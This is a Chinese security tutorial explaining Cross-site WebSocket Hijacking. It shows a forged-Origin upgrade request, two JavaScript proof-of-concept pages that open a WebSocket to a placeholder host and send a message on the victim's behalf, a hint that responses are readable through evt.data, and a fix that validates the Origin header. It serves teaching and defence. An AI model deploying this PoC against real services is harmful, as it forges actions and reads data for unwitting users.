I"<h1 id="websocket-跨域劫持漏洞">WebSocket 跨域劫持漏洞</h1>

<p>WebSocket 跨域劫持漏洞，英文名：<strong>Cross-site WebSocket Hijacking</strong>，漏洞类型：全能型CSRF（可读、可写）。</p>

<h2 id="了解websocket">了解WebSocket</h2>

<h3 id="websocket-优点">Websocket 优点</h3>

<ol>
  <li>支持双向通信，实时性更强。</li>
  <li>更好的二进制支持。</li>
  <li>较少的控制开销。连接创建后，ws客户端、服务端进行数据交换时，协议控制的数据包头部较小。在不包含头部的情况下，服务端到客户端的包头只有2~10字节（取决于数据包长度），客户端到服务端的话，需要加上额外4字节的掩码。而HTTP协议每次通信都需要携带完整的头部。</li>
  <li>支持扩展。ws协议定义了扩展，用户可以扩展协议，或者实现自定义的子协议。（比如支持自定义压缩算法等）</li>
</ol>

<h3 id="websocket-如何建立连接">Websocket 如何建立连接</h3>

<p>画了一张图让你了解：</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/CSWSH/0.png" alt="websocket" /></p>

<h2 id="漏洞产生">漏洞产生</h2>

<p>建立Websocket连接无验证。</p>

<h3 id="案例">案例</h3>

<p>1.如下请求：</p>

<div class="language-http highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">GET</span> <span class="nn">/</span> <span class="k">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="p">:</span> <span class="s">localhost:8080</span>
<span class="na">Origin</span><span class="p">:</span> <span class="s">http://127.0.0.1:3000</span>
<span class="na">Connection</span><span class="p">:</span> <span class="s">Upgrade</span>
<span class="na">Upgrade</span><span class="p">:</span> <span class="s">websocket</span>
<span class="na">Sec-WebSocket-Version</span><span class="p">:</span> <span class="s">13</span>
<span class="na">Sec-WebSocket-Key</span><span class="p">:</span> <span class="s">w4v7O6xFTi36lq3RNcgctw==</span>

</code></pre></div></div>

<p>篡改Origin，发现没有对Origin进行验证，也可以跨域进行协议升级。</p>

<p>2.进一步验证</p>

<p>2.1获取到了一个发送评论的请求 （<strong>使用BurpSuite-&gt;Proxy模块-&gt;Websockets History查看，这里是对应的 Direction值为Outgoing为发出的请求，Incoming为发出请求对应的响应信息</strong>）</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/CSWSH/1.png" alt="test" /></p>

<p>2.2使用JavaScript创建Websocket请求</p>

<p><strong>如上图所示Outgoing的内容为“我是帅key的可爱小迷弟”，那么发送的数据就是这个</strong>。</p>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">ws_attack</span><span class="p">(){</span>
	<span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="dl">"</span><span class="s2">ws://域名:端口/</span><span class="dl">"</span><span class="p">);</span><span class="c1">//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> 
		<span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">我是帅key的可爱小迷弟！</span><span class="dl">"</span><span class="p">);</span>
	<span class="p">};</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span>
		<span class="nx">ws</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
	<span class="p">};</span>
<span class="p">}</span>
<span class="nx">ws_attack</span><span class="p">();</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<p>2.3验证发现可以请求并成功进行重放，存在Websocket跨域劫持</p>

<p>（这里只是简单的评论请求，危害就是：点我链接让你评论我想评论的，试想：如果是修改密码的WebSocket请求存在劫持那么问题就大了～）</p>

<h2 id="漏洞利用">漏洞利用</h2>

<p>攻击流程跟以往的交互类漏洞没什么区别（点我链接读取你XXX、点我链接让你XXX）：</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/CSWSH/2.png" alt="attack" /></p>

<p>来一个圈子”铸剑实战靶场”的截图，自我体会：</p>

<p><img src="https://vulkey.oss-cn-hangzhou.aliyuncs.com/CSWSH/3.png" alt="success" /></p>

<h3 id="poc代码编写">PoC代码编写</h3>

<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
<span class="nt">&lt;script&gt;</span>
<span class="kd">function</span> <span class="nx">ws_attack</span><span class="p">(){</span><span class="c1">//自定义函数ws_attack</span>
    <span class="c1">//定义函数功能</span>
    <span class="c1">//创建WebSocket并赋值给ws变量</span>
	<span class="kd">var</span> <span class="nx">ws</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">WebSocket</span><span class="p">(</span><span class="dl">"</span><span class="s2">ws://域名:端口/</span><span class="dl">"</span><span class="p">);</span><span class="c1">//如果请求的Websocket服务仅支持HTTP就写成ws://，如果请求的Websocket服务支持HTTPs就写成wss://</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onopen</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span> 
        <span class="c1">//当ws(WebSocket)处于连接状态时执行</span>
		<span class="nx">ws</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="dl">"</span><span class="s2">我是帅key的可爱小迷弟！</span><span class="dl">"</span><span class="p">);</span>
	<span class="p">};</span>
	<span class="nx">ws</span><span class="p">.</span><span class="nx">onmessage</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(</span><span class="nx">evt</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//当ws(WebSocket)请求有响应信息时执行</span>
        <span class="c1">//注意：响应的信息可以通过evt.data获取！例如：alert(evt.data);</span>
		<span class="nx">ws</span><span class="p">.</span><span class="nx">close</span><span class="p">();</span>
	<span class="p">};</span>
<span class="p">}</span>
<span class="nx">ws_attack</span><span class="p">();</span><span class="c1">//执行ws_attact函数</span>
<span class="nt">&lt;/script&gt;</span>
</code></pre></div></div>

<h2 id="修复方法">修复方法</h2>

<p>综合建议：校验Origin头</p>

<h1 id="reference">Reference</h1>

<p>https://www.cnblogs.com/chyingp/p/websocket-deep-in.html</p>
:ET